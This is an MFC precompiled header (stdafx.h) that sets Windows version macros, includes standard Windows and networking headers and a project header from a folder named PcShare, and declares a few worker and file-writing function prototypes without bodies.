// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(AFX_STDAFX_H__A4E1F0E6_1006_4521_AEF9_0F9B1E6EFB45__INCLUDED_)
#define AFX_STDAFX_H__A4E1F0E6_1006_4521_AEF9_0F9B1E6EFB45__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define VC_EXTRALEAN		// Exclude rarely-used stuff from Windows headers

#define WINVER 0x0501		//为 Windows98 和 Windows 2000 及更新版本改变为适当的值。
#define _WIN32_WINNT 0x0501		//为 Windows98 和 Windows 2000 及更新版本改变为适当的值。
#define _WIN32_IE 0x0501	//为 IE 5.0 及更新版本改变为适当的值。

#include <afxwin.h>         // MFC core and standard components
#include <afxext.h>         // MFC extensions
#include <afxdisp.h>        // MFC Automation classes
#include <afxdtctl.h>		// MFC support for Internet Explorer 4 Common Controls
#ifndef _AFX_NO_AFXCMN_SUPPORT
#include <afxcmn.h>			// MFC support for Windows Common Controls
#endif // _AFX_NO_AFXCMN_SUPPORT

#include <windows.h>
#include <shlwapi.h>
#include <time.h>
#include <objbase.h>
#include <winsock2.h>
#include <Psapi.h>
#include <Shellapi.h>

#include "..\PcShare\MyMarco.h"
#include "Myfunc.h"

BOOL WriteMyFile(LPCTSTR m_FileName, LPVOID pData, DWORD nLen);
DWORD WorkThread(LPVOID lPvoid);
DWORD DoWork(LPCTSTR m_lpCmdLine);
Type IsShellSysType();

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__A4E1F0E6_1006_4521_AEF9_0F9B1E6EFB45__INCLUDED_)
